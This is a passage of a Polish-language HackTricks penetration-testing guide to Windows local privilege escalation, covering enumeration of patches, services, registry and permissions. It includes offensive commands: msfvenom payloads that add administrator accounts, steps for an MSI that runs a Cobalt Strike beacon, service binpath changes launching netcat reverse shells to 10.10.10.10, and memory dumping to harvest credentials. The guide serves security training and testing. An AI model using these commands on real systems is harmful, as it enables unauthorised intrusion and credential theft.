# Windows Local Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}

### **Najlepsze narzędzie do wyszukiwania wektorów eskalacji uprawnień lokalnych w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Wstępna teoria Windows

### Tokeny dostępu

**Jeśli nie wiesz, czym są tokeny dostępu w Windows, przeczytaj następującą stronę przed kontynuowaniem:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL - DACL/SACL/ACE

**Sprawdź następującą stronę, aby uzyskać więcej informacji na temat ACL - DACL/SACL/ACE:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, powinieneś przeczytać następującą stronę przed kontynuowaniem:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Kontrole bezpieczeństwa Windows

Istnieją różne elementy w Windows, które mogą **uniemożliwić ci enumerację systemu**, uruchamianie plików wykonywalnych lub nawet **wykrywanie twoich działań**. Powinieneś **przeczytać** następującą **stronę** i **enumerować** wszystkie te **mechanizmy obronne** przed rozpoczęciem enumeracji eskalacji uprawnień:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy wersja Windows ma jakąś znaną lukę (sprawdź również zastosowane poprawki).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Wersja Exploitów

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach Microsoftu. Ta baza danych zawiera ponad 4,700 luk w zabezpieczeniach, co pokazuje **ogromną powierzchnię ataku**, jaką prezentuje środowisko Windows.

**Na systemie**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowanego watsona)_

**Lokalnie z informacjami o systemie**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria Github exploitów:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy jakiekolwiek dane uwierzytelniające/ważne informacje są zapisane w zmiennych środowiskowych?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Pliki transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć w [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Szczegóły wykonania potoków PowerShell są rejestrowane, obejmując wykonane polecenia, wywołania poleceń i części skryptów. Jednakże, pełne szczegóły wykonania i wyniki wyjściowe mogą nie być rejestrowane.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji "Pliki transkrypcyjne" dokumentacji, wybierając **"Module Logging"** zamiast **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Aby wyświetlić ostatnie 15 zdarzeń z dzienników PowersShell, możesz wykonać:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Pełny zapis aktywności i zawartości wykonania skryptu jest rejestrowany, zapewniając, że każdy blok kodu jest dokumentowany w trakcie jego działania. Proces ten zachowuje kompleksowy ślad audytowy każdej aktywności, cenny dla forensyki i analizy złośliwego zachowania. Dokumentując wszystkie aktywności w momencie wykonania, dostarczane są szczegółowe informacje na temat procesu.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zdarzenia logowania dla Bloku Skryptu można znaleźć w Podglądzie zdarzeń systemu Windows pod ścieżką: **Dzienniki aplikacji i usług > Microsoft > Windows > PowerShell > Operacyjny**.\
Aby wyświetlić ostatnie 20 zdarzeń, możesz użyć:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ustawienia Internetu
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Dyski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Możesz skompromitować system, jeśli aktualizacje nie są żądane za pomocą http**S**, lecz http.

Zaczynasz od sprawdzenia, czy sieć używa aktualizacji WSUS bez SSL, uruchamiając następujące:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Jeśli otrzymasz odpowiedź taką jak:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` jest równe `1`.

Wtedy, **jest to podatne na atak.** Jeśli ostatni rejestr jest równy 0, to wpis WSUS zostanie zignorowany.

Aby wykorzystać te luki, możesz użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - są to zbrojne skrypty exploitów MiTM do wstrzykiwania 'fałszywych' aktualizacji do ruchu WSUS bez SSL.

Przeczytaj badania tutaj:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Zasadniczo, to jest wada, którą wykorzystuje ten błąd:

> Jeśli mamy możliwość modyfikacji naszego lokalnego proxy użytkownika, a aktualizacje Windows używają proxy skonfigurowanego w ustawieniach Internet Explorera, to mamy moc uruchomienia [PyWSUS](https://github.com/GoSecure/pywsus) lokalnie, aby przechwycić nasz własny ruch i uruchomić kod jako podwyższony użytkownik na naszym zasobie.
>
> Ponadto, ponieważ usługa WSUS używa ustawień bieżącego użytkownika, będzie również korzystać z jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat samopodpisany dla nazwy hosta WSUS i dodamy ten certyfikat do magazynu certyfikatów bieżącego użytkownika, będziemy w stanie przechwycić zarówno ruch WSUS HTTP, jak i HTTPS. WSUS nie używa mechanizmów podobnych do HSTS, aby wdrożyć walidację typu trust-on-first-use na certyfikacie. Jeśli przedstawiony certyfikat jest zaufany przez użytkownika i ma poprawną nazwę hosta, zostanie zaakceptowany przez usługę.

Możesz wykorzystać tę lukę, używając narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie uwolnione).

## KrbRelayUp

Luka **w eskalacji uprawnień lokalnych** istnieje w środowiskach **domenowych** Windows w określonych warunkach. Warunki te obejmują środowiska, w których **podpisywanie LDAP nie jest egzekwowane,** użytkownicy posiadają prawa do samodzielnego konfigurowania **Resource-Based Constrained Delegation (RBCD)** oraz możliwość tworzenia komputerów w domenie. Ważne jest, aby zauważyć, że te **wymagania** są spełnione przy użyciu **domyślnych ustawień**.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Aby uzyskać więcej informacji na temat przebiegu ataku, sprawdź [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Jeśli** te 2 rejestry są **włączone** (wartość to **0x1**), to użytkownicy o dowolnych uprawnieniach mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Ładunki Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę, używając modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu binarny plik MSI systemu Windows w celu eskalacji uprawnień. Ten skrypt zapisuje wstępnie skompilowany instalator MSI, który prosi o dodanie użytkownika/grupy (więc będziesz potrzebować dostępu GIU):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Przeczytaj ten samouczek, aby dowiedzieć się, jak stworzyć opakowanie MSI za pomocą tych narzędzi. Zauważ, że możesz opakować plik "**.bat**", jeśli **tylko** chcesz **wykonać** **linie poleceń**.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Create MSI with WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Create MSI with Visual Studio

* **Wygeneruj** za pomocą Cobalt Strike lub Metasploit **nowy ładunek TCP EXE Windows** w `C:\privesc\beacon.exe`
* Otwórz **Visual Studio**, wybierz **Utwórz nowy projekt** i wpisz "installer" w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Dalej**.
* Nadaj projektowi nazwę, na przykład **AlwaysPrivesc**, użyj **`C:\privesc`** jako lokalizacji, wybierz **umieść rozwiązanie i projekt w tym samym katalogu**, a następnie kliknij **Utwórz**.
* Klikaj **Dalej**, aż dojdziesz do kroku 3 z 4 (wybierz pliki do dołączenia). Kliknij **Dodaj** i wybierz ładunek Beacon, który właśnie wygenerowałeś. Następnie kliknij **Zakończ**.
* Podświetl projekt **AlwaysPrivesc** w **Eksploratorze rozwiązań** i w **Właściwościach** zmień **TargetPlatform** z **x86** na **x64**.
* Istnieją inne właściwości, które możesz zmienić, takie jak **Autor** i **Producent**, co może sprawić, że zainstalowana aplikacja będzie wyglądać bardziej wiarygodnie.
* Kliknij prawym przyciskiem myszy na projekt i wybierz **Widok > Akcje niestandardowe**.
* Kliknij prawym przyciskiem myszy na **Instaluj** i wybierz **Dodaj akcję niestandardową**.
* Kliknij dwukrotnie na **Folder aplikacji**, wybierz swój plik **beacon.exe** i kliknij **OK**. To zapewni, że ładunek beacon zostanie wykonany, gdy instalator zostanie uruchomiony.
* W **Właściwościach akcji niestandardowej** zmień **Run64Bit** na **True**.
* Na koniec **zbuduj to**.
* Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że ustawiłeś platformę na x64.

### MSI Installation

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Aby wykorzystać tę lukę, możesz użyć: _exploit/windows/local/always\_install\_elevated_

## Oprogramowanie antywirusowe i detektory

### Ustawienia audytu

Te ustawienia decydują o tym, co jest **rejestrowane**, więc powinieneś zwrócić uwagę
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, warto wiedzieć, dokąd są wysyłane logi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** jest zaprojektowany do **zarządzania lokalnymi hasłami administratorów**, zapewniając, że każde hasło jest **unikalne, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Te hasła są bezpiecznie przechowywane w Active Directory i mogą być dostępne tylko dla użytkowników, którzy otrzymali wystarczające uprawnienia poprzez ACL, co pozwala im na przeglądanie lokalnych haseł administratorów, jeśli są do tego upoważnieni.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Jeśli jest aktywne, **hasła w postaci czystego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ochrona LSA

Począwszy od **Windows 8.1**, Microsoft wprowadził ulepszoną ochronę dla Lokalnej Władzy Bezpieczeństwa (LSA), aby **zablokować** próby nieufnych procesów do **odczytu jej pamięci** lub wstrzykiwania kodu, co dodatkowo zabezpiecza system.\
[**Więcej informacji o Ochronie LSA tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest ochrona poświadczeń przechowywanych na urządzeniu przed zagrożeniami takimi jak ataki pass-the-hash. | [**Więcej informacji o Credentials Guard tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Poświadczenia domeny** są uwierzytelniane przez **Lokalną Władzę Bezpieczeństwa** (LSA) i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika są uwierzytelniane przez zarejestrowany pakiet zabezpieczeń, poświadczenia domeny dla użytkownika są zazwyczaj ustanawiane.\
[**Więcej informacji o poświadczeniach podręcznych tutaj**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Użytkownicy i Grupy

### Wylicz Użytkowników i Grupy

Powinieneś sprawdzić, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupy uprzywilejowane

Jeśli **należysz do jakiejś grupy uprzywilejowanej, możesz być w stanie podnieść uprawnienia**. Dowiedz się o grupach uprzywilejowanych i jak je nadużywać, aby podnieść uprawnienia tutaj:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Manipulacja tokenami

**Dowiedz się więcej** o tym, czym jest **token** na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
Sprawdź następującą stronę, aby **dowiedzieć się o interesujących tokenach** i jak je nadużywać:

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### Zalogowani użytkownicy / Sesje
```bash
qwinsta
klist sessions
```
### Foldery domowe
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Polityka Haseł
```bash
net accounts
```
### Pobierz zawartość schowka
```bash
powershell -command "Get-Clipboard"
```
## Uruchamianie procesów

### Uprawnienia plików i folderów

Przede wszystkim, lista procesów **sprawdza hasła w linii poleceń procesu**.\
Sprawdź, czy możesz **nadpisać jakiś działający plik binarny** lub czy masz uprawnienia do zapisu w folderze binarnym, aby wykorzystać możliwe [**ataki DLL Hijacking**](dll-hijacking/):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Zawsze sprawdzaj, czy działają możliwe [**debuggery electron/cef/chromium**; możesz je wykorzystać do eskalacji uprawnień](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Sprawdzanie uprawnień binarnych procesów**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Sprawdzanie uprawnień folderów binarnych procesów (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z sysinternals. Usługi takie jak FTP mają **poświadczenia w postaci czystego tekstu w pamięci**, spróbuj zrzucić pamięć i odczytać poświadczenia.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Niezabezpieczone aplikacje GUI

**Aplikacje działające jako SYSTEM mogą umożliwić użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: "Pomoc i wsparcie systemu Windows" (Windows + F1), wyszukaj "wiersz polecenia", kliknij "Kliknij, aby otworzyć Wiersz polecenia"

## Usługi

Uzyskaj listę usług:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze
```bash
sc qc <service_name>
```
Zaleca się posiadanie binarnego **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Zaleca się sprawdzenie, czy "Użytkownicy uwierzytelnieni" mogą modyfikować jakąkolwiek usługę:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli otrzymujesz ten błąd (na przykład z SSDPSRV):

_Błąd systemu 1058 wystąpił._\
_Usluga nie może zostać uruchomiona, ponieważ jest wyłączona lub nie ma z nią powiązanych włączonych urządzeń._

Możesz ją włączyć używając
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Weź pod uwagę, że usługa upnphost zależy od SSDPSRV, aby działać (dla XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:
```
sc.exe config usosvc start= auto
```
### **Modyfikacja ścieżki binarnej usługi**

W scenariuszu, w którym grupa "Użytkownicy uwierzytelnieni" posiada **SERVICE\_ALL\_ACCESS** do usługi, możliwa jest modyfikacja wykonywalnego pliku binarnego usługi. Aby zmodyfikować i wykonać **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Uruchom ponownie usługę
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Uprawnienia mogą być eskalowane poprzez różne uprawnienia:

* **SERVICE\_CHANGE\_CONFIG**: Umożliwia rekonfigurację binarnego pliku usługi.
* **WRITE\_DAC**: Umożliwia rekonfigurację uprawnień, co prowadzi do możliwości zmiany konfiguracji usługi.
* **WRITE\_OWNER**: Zezwala na przejęcie własności i rekonfigurację uprawnień.
* **GENERIC\_WRITE**: Dziedziczy zdolność do zmiany konfiguracji usługi.
* **GENERIC\_ALL**: Również dziedziczy zdolność do zmiany konfiguracji usługi.

Do wykrywania i wykorzystania tej podatności można wykorzystać _exploit/windows/local/service\_permissions_.

### Słabe uprawnienia binarnych plików usług

**Sprawdź, czy możesz zmodyfikować binarny plik, który jest wykonywany przez usługę** lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się binarny plik ([**DLL Hijacking**](dll-hijacking/))**.**\
Możesz uzyskać każdy binarny plik, który jest wykonywany przez usługę, używając **wmic** (nie w system32) i sprawdzić swoje uprawnienia za pomocą **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Możesz również użyć **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Usługi rejestru modyfikują uprawnienia

Powinieneś sprawdzić, czy możesz modyfikować jakikolwiek rejestr usług.\
Możesz **sprawdzić** swoje **uprawnienia** do rejestru **usług** wykonując:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** posiadają uprawnienia `FullControl`. Jeśli tak, binarny plik wykonywany przez usługę może zostać zmieniony.

Aby zmienić ścieżkę binarnego pliku wykonywanego:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz to uprawnienie w rejestrze, oznacza to, że **możesz tworzyć podrejestry z tego**. W przypadku usług Windows jest to **wystarczające do wykonania dowolnego kodu:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Niecytowane ścieżki usług

Jeśli ścieżka do pliku wykonywalnego nie jest w cudzysłowach, Windows spróbuje wykonać każdy fragment przed spacją.

Na przykład, dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje wykonać:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lista wszystkich niecytowanych ścieżek usług, z wyłączeniem tych należących do wbudowanych usług systemu Windows:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Możesz wykryć i wykorzystać** tę lukę za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie stworzyć binarny plik usługi za pomocą metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows pozwala użytkownikom określić działania, które mają być podjęte, jeśli usługa zawiedzie. Ta funkcja może być skonfigurowana, aby wskazywać na binarny plik. Jeśli ten plik binarny jest wymienny, eskalacja uprawnień może być możliwa. Więcej szczegółów można znaleźć w [oficjalnej dokumentacji](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Applications

### Installed Applications

Sprawdź **uprawnienia plików binarnych** (może uda ci się nadpisać jeden i eskalować uprawnienia) oraz **folderów** ([DLL Hijacking](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać jakiś specjalny plik, lub czy możesz zmodyfikować jakiś plik binarny, który będzie wykonywany przez konto Administratora (schedtasks).

Sposobem na znalezienie słabych uprawnień do folderów/plików w systemie jest:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
